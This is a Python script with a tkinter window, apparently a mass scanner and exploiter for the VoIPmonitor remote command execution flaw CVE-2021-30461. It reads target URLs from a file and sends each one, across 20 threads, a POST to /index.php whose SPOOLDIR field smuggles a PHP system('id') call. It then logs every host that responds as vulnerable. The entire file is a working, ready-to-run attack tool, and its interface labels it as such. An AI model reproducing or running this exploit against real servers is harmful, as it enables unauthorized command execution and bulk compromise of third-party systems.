import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def VoIPmonitor_RCE_CVE_2021_30461_exp(url):
    poc = r"""/index.php"""
    url = url + poc
    data = "SPOOLDIR=test%22.system%28id%29.%22&recheck=annen"
    try:
        res = requests.post(url, data=data,verify=False,timeout=3)
        if "groups=" in res.text:
            VoIPmonitor_RCE_CVE_2021_30461_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            VoIPmonitor_RCE_CVE_2021_30461_text.see(END)
            with open ("存在VoIPmonitor 远程命令执行漏洞(CVE-2021-30461)的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            VoIPmonitor_RCE_CVE_2021_30461_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            VoIPmonitor_RCE_CVE_2021_30461_text.see(END)
    except Exception as err:
        VoIPmonitor_RCE_CVE_2021_30461_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        VoIPmonitor_RCE_CVE_2021_30461_text.see(END)
def get_VoIPmonitor_RCE_CVE_2021_30461_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def VoIPmonitor_RCE_CVE_2021_30461_gui():
    VoIPmonitor_RCE_CVE_2021_30461 = tk.Tk()
    VoIPmonitor_RCE_CVE_2021_30461.geometry("910x450")
    VoIPmonitor_RCE_CVE_2021_30461.title("VoIPmonitor 远程命令执行漏洞(CVE-2021-30461)一把梭")
    VoIPmonitor_RCE_CVE_2021_30461.resizable(0, 0)
    VoIPmonitor_RCE_CVE_2021_30461.iconbitmap('logo.ico')
    global VoIPmonitor_RCE_CVE_2021_30461_text
    VoIPmonitor_RCE_CVE_2021_30461_text = scrolledtext.ScrolledText(VoIPmonitor_RCE_CVE_2021_30461,width=123, height=25)
    VoIPmonitor_RCE_CVE_2021_30461_text.grid(row=0, column=0, padx=10, pady=10)
    VoIPmonitor_RCE_CVE_2021_30461_text.see(END)
    addrs = get_VoIPmonitor_RCE_CVE_2021_30461_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(VoIPmonitor_RCE_CVE_2021_30461_exp, addr)
    VoIPmonitor_RCE_CVE_2021_30461.mainloop()